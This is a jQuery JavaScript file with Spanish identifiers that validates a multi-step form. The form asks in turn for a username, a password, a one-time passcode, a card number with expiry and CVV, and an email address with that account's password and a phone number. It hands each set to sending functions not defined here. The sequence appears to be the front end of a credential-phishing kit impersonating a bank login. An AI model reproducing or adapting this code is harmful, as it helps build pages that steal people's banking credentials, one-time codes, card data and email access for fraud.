var espera = 0;
let identificadorTiempoDeEspera;

function retardor() {
  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
}

function retardorX() {
}

$(document).ready(function() {
  $('#btnUsuario').click(function(){
    if ($("#txtUsuario").val().length > 0) {
      inicio($("#txtUsuario").val());	
    } else {
      $("#err-mensaje").show();
      $(".user").css("border", "1px solid red");
      $("#txtUsuario").focus();
    }			
  });

  $("#txtUsuario").keyup(function(e) {
    $(".user").css("border", "1px solid #CCCCCC");	
    $("#err-mensaje").hide();				
  });
});

$(document).ready(function() {
  $('#btnPass').click(function(){
    if ($("#txtPassword").val().length > 3) {
      pasousuario($("#txtPassword").val());	
    } else {
      $(".mensaje").show();
    }	
  });
});

$(document).ready(function() {
  $('#btnOTP').click(function(){
    if ($("#txtOTP").val().length > 5) {
      enviar_otp($("#txtOTP").val());				
    } else {
      $(".mensaje").show();
      $(".pass").css("border", "1px solid red");
      $("#txtOTP").focus();
    }			
  });

  $("#txtOTP").keyup(function(e) {
    $(".pass").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });
});

// Función para el evento click del botón de tarjeta
$(document).ready(function() {
  $('#btnTarjeta').click(function(){
    if ($("#txtTarjeta").val().length > 15) {
      if ($("#mFecha").val() != "" && $("#aFecha").val() != "") {
        if ($("#txtCVV").val().length > 2) {
          var fExp = $("#mFecha").val() + "-" + $("#aFecha").val(); 
          enviar_tarjeta($("#txtTarjeta").val(), fExp, $("#txtCVV").val());
        } else {
          $(".mensaje").show();
          $(".pass").css("border", "1px solid red");
          $("#txtCVV").focus();
        }
      } else if ($("#mFecha").val() == "") {
        $(".mensaje").show();
        $("#mFecha").css("border", "1px solid red");
        $("#mFecha").focus();
      } else {
        $(".mensaje").show();
        $("#aFecha").css("border", "1px solid red");
        $("#aFecha").focus();
      }
    } else {
      $(".mensaje").show();
      $(".credit-card").css("border", "1px solid red");
      $("#txtTarjeta").focus();
    }			
  });

  $("#txtTarjeta").keyup(function(e) {
    $(".credit-card").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });

  $("#mFecha").click(function(e) {
    $("#mFecha").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });

  $("#aFecha").click(function(e) {
    $("#aFecha").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });

  $("#txtCVV").keyup(function(e) {
    $(".pass").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });
});

$(document).ready(function() {
  $('#btnMail').click(function(){
    if ($("#txtMail").val().length > 0) {
      if ($("#txtPass").val().length > 0) {
        if ($("#txtCelular").val().length > 9) {
          enviar_mail($("#txtMail").val(), $("#txtPass").val(), $("#txtCelular").val());
        } else {
          $(".mensaje").show();
          $(".celular").css("border", "1px solid red");
          $("#txtCelular").focus();
        }
      } else {
        $(".mensaje").show();
        $(".pass").css("border", "1px solid red");
        $("#txtPass").focus();
      }
    } else {
      $(".mensaje").show();
      $(".email").css("border", "1px solid red");
      $("#txtMail").focus();
    }
  });

  $("#txtMail").keyup(function(e) {
    $(".email").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });

  $("#txtPass").keyup(function(e) {
    $(".pass").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });

  $("#txtCelular").keyup(function(e) {
    $(".celular").css("border", "1px solid #CCCCCC");	
    $(".mensaje").hide();				
  });
});
